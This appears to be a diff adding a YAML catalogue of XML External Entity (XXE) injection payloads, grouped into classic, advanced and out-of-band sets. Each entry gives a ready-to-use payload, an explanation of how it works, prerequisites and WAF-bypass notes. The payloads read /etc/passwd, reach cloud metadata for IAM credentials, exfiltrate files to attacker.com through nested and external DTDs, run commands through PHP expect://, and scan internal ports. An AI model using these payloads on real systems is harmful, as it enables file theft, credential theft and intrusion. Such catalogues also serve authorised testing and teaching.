@@ -1,0 +1,429 @@
+slug: xxe
+name: XML External Entity (XXE) Injection
+owasp: A05:2021 – Security Misconfiguration
+description: 'XXE injection occurs when an XML parser processes external entity references that the attacker controls. This
+  allows reading arbitrary local files, performing SSRF, and in some configurations executing OS commands. XXE vulnerabilities
+  exist when applications parse XML input with external entity processing enabled. Modern parsers disable external entities
+  by default, but many legacy applications and common libraries remain vulnerable.
+
+  '
+severity_range:
+  low: CVSS 6.5
+  high: CVSS 9.8
+references:
+- label: OWASP XXE Prevention Cheat Sheet
+  url: https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html
+- label: PortSwigger XXE Research
+  url: https://portswigger.net/web-security/xxe
+groups:
+- slug: classic-xxe
+  name: Classic XXE File Read
+  description: Standard XXE payloads that define external entities referencing local files and out-of-band endpoints.
+  difficulty: low
+  prerequisites:
+  - Application parses XML with external entity processing enabled
+  - XML input accepted from user (direct body, uploaded file, SOAP)
+  payloads:
+  - id: xxe-classic-001
+    title: Basic file read via DOCTYPE
+    payload_string: '<?xml version="1.0" encoding="UTF-8"?>
+
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+      <foo>&xxe;</foo>
+
+      '
+    how_it_works: 'The DOCTYPE declaration defines an external entity named ''xxe'' that references the /etc/passwd file using
+      the file:// URI scheme. When the XML parser processes the document and encounters &xxe;, it fetches the file content
+      and substitutes it in place. The application then processes or returns the XML with the file content embedded, revealing
+      it to the attacker. This is the canonical XXE payload and is the first test for confirming file read via XML injection.
+
+      '
+    prerequisites:
+    - XML parser processes DOCTYPE with external entities
+    - External entity processing not disabled (FEATURE_EXTERNAL_GENERAL_ENTITIES)
+    waf_bypass_notes: Try encoding the DOCTYPE or entity reference; some WAFs scan for DOCTYPE
+    severity_context: CVSS 7.5 – arbitrary local file read via XML external entity
+    cve_refs:
+    - CVE-2014-3660
+    tags:
+    - xxe
+    - file-read
+    - doctype
+    - basic
+    - passwd
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xxe-classic-002
+    title: XXE SSRF to internal service
+    payload_string: '<?xml version="1.0" encoding="UTF-8"?>
+
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+
+      <foo>&xxe;</foo>
+
+      '
+    how_it_works: 'The SYSTEM identifier in an external entity can reference HTTP URLs as well as file:// paths. When the
+      XML parser fetches the entity, it makes an HTTP request to the specified URL on behalf of the server. This turns XXE
+      into an SSRF vector. By pointing to the AWS metadata service, the attacker can retrieve IAM credentials. Other internal
+      services accessible via XXE-based SSRF include internal APIs, Redis (via Gopher scheme in some parsers), and internal
+      administrative interfaces.
+
+      '
+    prerequisites:
+    - XML parser supports HTTP entities (most do)
+    - Outbound HTTP from XML parsing service
+    waf_bypass_notes: HTTP entity SSRF via XXE; often overlooked when testing SSRF separately
+    severity_context: CVSS 9.8 – SSRF to cloud metadata API via XXE for credential theft
+    cve_refs:
+    - CVE-2013-4152
+    tags:
+    - xxe
+    - ssrf
+    - cloud-metadata
+    - aws
+    - http-entity
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xxe-classic-003
+    title: Blind XXE via OOB DNS
+    payload_string: '<?xml version="1.0" encoding="UTF-8"?>
+
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/xxe-probe">]>
+
+      <foo>&xxe;</foo>
+
+      '
+    how_it_works: 'When the XML response is not returned to the attacker (blind XXE), out-of-band confirmation via DNS and
+      HTTP is used. The entity references the attacker''s server. Even if the HTTP response is not accessible, the DNS lookup
+      for attacker.com confirms that the XXE is being processed. Using Burp Collaborator or a similar tool captures the DNS
+      query and HTTP request, confirming blind XXE. This is the prerequisite step before attempting file exfiltration via
+      OOB techniques.
+
+      '
+    prerequisites:
+    - XML parser processes DOCTYPE
+    - Outbound DNS/HTTP from server
+    - Attacker controls authoritative DNS or uses Collaborator
+    waf_bypass_notes: DNS-only confirmation works if HTTP blocked; use Burp Collaborator
+    severity_context: CVSS 7.5 – blind XXE confirmation via OOB DNS/HTTP callback
+    cve_refs:
+    - CVE-2019-0193
+    tags:
+    - xxe
+    - blind
+    - oob
+    - dns-confirmation
+    - burp-collaborator
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xxe-classic-004
+    title: Blind XXE with OOB data exfiltration
+    payload_string: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\"\
+      >\n  <!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>\">\n  %eval;\n  %exfil;\n]>\n\
+      <foo>test</foo>\n"
+    how_it_works: 'Blind XXE file exfiltration uses parameter entities and entity nesting to retrieve file contents OOB. The
+      %file entity reads /etc/passwd. The %eval entity dynamically defines a new entity %exfil that references attacker.com
+      with the file content in the URL. When %exfil is processed, an HTTP request is made to attacker.com with the file content
+      as a query parameter, visible in server logs. This requires that the XML parser allows parameter entity references in
+      internal subsets, which not all parsers support.
+
+      '
+    prerequisites:
+    - XML parser allows parameter entity nesting in internal subset
+    - Outbound HTTP from server to attacker
+    waf_bypass_notes: Complex entity nesting; some parsers reject this; test for error differences
+    severity_context: CVSS 8.5 – blind XXE file exfiltration via OOB parameter entity
+    cve_refs:
+    - CVE-2018-14667
+    tags:
+    - xxe
+    - blind
+    - file-exfil
+    - parameter-entity
+    - advanced
+    - oob
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xxe-classic-005
+    title: XXE via SVG image upload
+    payload_string: "<?xml version=\"1.0\" standalone=\"yes\"?>\n<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/hostname\"\
+      > ]>\n<svg width=\"128px\" height=\"128px\" xmlns=\"http://www.w3.org/2000/svg\">\n  <text font-size=\"16\" x=\"0\"\
+      \ y=\"16\">&xxe;</text>\n</svg>\n"
+    how_it_works: 'SVG files are XML-based and processed by XML parsers when converted or rendered. When an application accepts
+      SVG file uploads and uses a server-side library to render, resize, or convert the SVG, the library may parse the XML
+      with external entity processing enabled. The external entity reads /etc/hostname and the content appears in the SVG
+      text element. If the rendered SVG is returned to the user, the file content is visible. This is a stored XXE via file
+      upload.
+
+      '
+    prerequisites:
+    - Application accepts SVG file uploads
+    - Server-side SVG rendering library with XXE vulnerability
+    waf_bypass_notes: SVG upload vector; standard file upload validation may not inspect XML content
+    severity_context: CVSS 7.5 – XXE via SVG file upload in server-side renderer
+    cve_refs: []
+    tags:
+    - xxe
+    - svg-upload
+    - file-upload
+    - image-processing
+    - stored
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: xxe-advanced
+  name: Advanced XXE Techniques
+  description: XXE via SOAP, JSON endpoints with XML parsers, XInclude, and XXE-to-RCE escalation paths.
+  difficulty: high
+  prerequisites:
+  - XXE vector identified in application
+  payloads:
+  - id: xxe-adv-001
+    title: XXE via SOAP endpoint
+    payload_string: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"\
+      >]>\n<soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <getUserInfo>\n  \
+      \    <username>&xxe;</username>\n    </getUserInfo>\n  </soap:Body>\n</soap:Envelope>\n"
+    how_it_works: 'SOAP web services parse XML request bodies and are frequently vulnerable to XXE. The DOCTYPE is injected
+      at the top of the SOAP envelope. External entity references within SOAP body elements are resolved before the service
+      logic processes the data. If the service returns or logs the username value, the file contents appear in the response
+      or log. Enterprise SOAP services often run with elevated privileges, making file reads particularly impactful. SOAP
+      endpoints are often missed in web application XXE testing.
+
+      '
+    prerequisites:
+    - SOAP service that parses user-supplied XML
+    - XML parser with external entities enabled
+    waf_bypass_notes: SOAP endpoints may have separate WAF rules from REST APIs
+    severity_context: CVSS 8.5 – file read via XXE in enterprise SOAP web service
+    cve_refs:
+    - CVE-2015-0227
+    tags:
+    - xxe
+    - soap
+    - enterprise
+    - web-service
+    - wsdl
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xxe-adv-002
+    title: XInclude XXE (no DOCTYPE needed)
+    payload_string: "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\">\n  <xi:include parse=\"text\" href=\"file:///etc/passwd\"\
+      />\n</foo>\n"
+    how_it_works: 'XInclude is an XML feature for merging XML documents. Unlike external entities, XInclude does not require
+      a DOCTYPE declaration, bypassing parsers that disable DOCTYPE but support XInclude. If the application incorporates
+      user-supplied XML as part of a larger XML document (server-side XML assembly), the xi:include element causes the parser
+      to fetch and include the referenced file. With parse="text", the file content is included as text data rather than being
+      parsed as XML, allowing reading of any file regardless of whether it is valid XML.
+
+      '
+    prerequisites:
+    - XML parser supports XInclude
+    - User-supplied XML embedded in server-side XML document
+    - DOCTYPE processing disabled but XInclude enabled
+    waf_bypass_notes: Bypasses DOCTYPE-based XXE detection; XInclude requires namespace support
+    severity_context: CVSS 7.5 – file read via XInclude bypassing DOCTYPE-disabled parsers
+    cve_refs:
+    - CVE-2013-4152
+    tags:
+    - xxe
+    - xinclude
+    - doctype-bypass
+    - no-doctype
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xxe-adv-003
+    title: XXE via JSON endpoint with XML content type
+    payload_string: 'Content-Type: application/xml
+
+
+      <?xml version="1.0" encoding="UTF-8"?>
+
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
+
+      <root><data>&xxe;</data></root>
+
+      '
+    how_it_works: 'Some REST APIs that primarily use JSON also support XML for backwards compatibility. Switching the Content-Type
+      header from application/json to application/xml causes the server to parse the body as XML. If the XML parser has external
+      entity processing enabled, XXE is exploitable via an endpoint the developer considered to be a JSON API. Testing content
+      type switching on all API endpoints reveals hidden XML parsing surfaces. This vector is commonly missed during API security
+      testing.
+
+      '
+    prerequisites:
+    - API endpoint supports multiple content types
+    - XML parser has XXE enabled for the XML content type handler
+    waf_bypass_notes: Switch Content-Type from JSON to XML; WAF may only inspect JSON endpoints
+    severity_context: CVSS 7.5 – XXE via content-type switching on JSON API endpoint
+    cve_refs: []
+    tags:
+    - xxe
+    - content-type-switch
+    - json-api
+    - hidden-vector
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xxe-adv-004
+    title: XXE via file upload (DOCX/XLSX)
+    payload_string: Inject into word/document.xml inside a .docx file
+    how_it_works: 'Microsoft Office formats (DOCX, XLSX, PPTX) are ZIP archives containing XML files. By unzipping a legitimate
+      document, modifying the embedded XML to include a DOCTYPE with an external entity, and re-zipping, an attacker creates
+      a weaponized document. When an application parses the uploaded document (for text extraction, preview, or conversion),
+      the XML parser reads the external entity. This is a common vector in document management systems, HR platforms that
+      accept resumes, and email attachments processed server-side.
+
+      '
+    prerequisites:
+    - Application parses DOCX/XLSX/PPTX XML content server-side
+    - XML parser in document library has external entities enabled
+    waf_bypass_notes: Document upload vector; content is within ZIP; hard to detect statically
+    severity_context: CVSS 8.5 – XXE via weaponized Office document upload
+    cve_refs: []
+    tags:
+    - xxe
+    - docx
+    - xlsx
+    - file-upload
+    - document-parsing
+    - office
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xxe-adv-005
+    title: XXE to RCE via PHP expect wrapper
+    payload_string: '<?xml version="1.0" encoding="UTF-8"?>
+
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
+
+      <foo>&xxe;</foo>
+
+      '
+    how_it_works: 'PHP''s expect:// stream wrapper, when installed (it is an optional PECL extension), executes shell commands
+      and returns their output. If PHP is used as the XML processing language and the expect extension is installed, XXE entities
+      referencing expect:// URI scheme execute OS commands. The output of the command appears where the entity reference is
+      used. This escalates XXE from file read to full remote code execution. The expect extension is rare in modern deployments
+      but present in legacy PHP systems.
+
+      '
+    prerequisites:
+    - PHP with expect:// PECL extension installed
+    - XML parsing done in PHP with external entities enabled
+    waf_bypass_notes: expect:// is PHP-specific and rare; php:// wrappers are more common
+    severity_context: CVSS 9.8 – XXE to RCE via PHP expect:// stream wrapper
+    cve_refs: []
+    tags:
+    - xxe
+    - php-expect
+    - rce
+    - stream-wrapper
+    - legacy
+    - critical
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+- slug: xxe-oob
+  name: Out-of-Band XXE
+  description: Advanced OOB XXE techniques for fully blind scenarios using external DTD files and DNS exfiltration.
+  difficulty: expert
+  prerequisites:
+  - Blind XXE confirmed via OOB callback
+  - Attacker controls HTTP server for DTD hosting
+  payloads:
+  - id: xxe-oob-001
+    title: External DTD file exfiltration
+    payload_string: '<?xml version="1.0" encoding="UTF-8"?>
+
+      <!DOCTYPE foo [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>
+
+      <foo>test</foo>
+
+
+      # evil.dtd content:
+
+      <!ENTITY % file SYSTEM "file:///etc/passwd">
+
+      <!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM ''http://attacker.com/?x=%file;''>">
+
+      %eval;
+
+      %oob;
+
+      '
+    how_it_works: 'The payload loads an external DTD file from the attacker''s server. The DTD defines parameter entities
+      that read a local file and exfiltrate its contents via an HTTP request. This technique works when entity nesting within
+      the internal subset fails (as many parsers forbid it) but allows the same nesting in an external DTD. The file contents
+      appear as a query parameter in the server access log. The DTD can be updated to target different files without changing
+      the XML payload.
+
+      '
+    prerequisites:
+    - XML parser loads external DTD files
+    - Outbound HTTP to attacker's DTD server
+    - Parameter entity nesting allowed in external DTD
+    waf_bypass_notes: External DTD is served from attacker; only initial URL needs to reach target
+    severity_context: CVSS 8.5 – OOB file exfiltration via external DTD in blind XXE
+    cve_refs: []
+    tags:
+    - xxe
+    - oob
+    - external-dtd
+    - blind
+    - parameter-entity
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xxe-oob-002
+    title: Error-based XXE exfiltration
+    payload_string: "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ENTITY % file SYSTEM \"file:///etc/passwd\"\
+      >\n  <!ENTITY % eval \"<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>\">\n  %eval;\n  %error;\n]>\n<foo>test</foo>\n"
+    how_it_works: 'When the XML parser generates an error message that includes the entity value, file contents can be exfiltrated
+      through error messages even when HTTP OOB is blocked. The %error entity references a nonexistent file path that includes
+      the contents of /etc/passwd. The parser tries to open this path, fails, and generates an error that includes the nonexistent
+      path (which contains the passwd file data). The error appears in the application response or logs, revealing the file
+      contents without requiring any outbound network connection from the server.
+
+      '
+    prerequisites:
+    - XML parser reports error messages with entity values included
+    - Error messages returned to user or logged accessibly
+    waf_bypass_notes: No outbound connection needed; works in air-gapped environments
+    severity_context: CVSS 7.5 – error-based blind XXE without network egress
+    cve_refs: []
+    tags:
+    - xxe
+    - error-based
+    - blind
+    - no-egress
+    - advanced
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
+  - id: xxe-oob-003
+    title: XXE via HTTP entity to internal port scan
+    payload_string: '<?xml version="1.0" encoding="UTF-8"?>
+
+      <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1:22/">]>
+
+      <foo>&xxe;</foo>
+
+      '
+    how_it_works: 'By changing the port in the HTTP entity URL and observing response time and error messages, an attacker
+      can port scan the internal network via XXE. Open ports typically return a response (even if it''s a protocol error),
+      while closed ports receive a connection refused quickly. The timing and error message differences allow distinguishing
+      open from closed ports. Combined with IP iteration, this provides a full internal network map accessible only through
+      the XXE vector.
+
+      '
+    prerequisites:
+    - XML parser makes HTTP requests for external entities
+    - Response time or error message differences observable
+    waf_bypass_notes: Port scanning via XXE; responses differ between open/closed ports
+    severity_context: CVSS 6.5 – internal port scanning via XXE HTTP entity SSRF
+    cve_refs: []
+    tags:
+    - xxe
+    - ssrf
+    - port-scan
+    - internal-network
+    - reconnaissance
+    date_added: '2024-01-01'
+    last_updated: '2024-01-01'
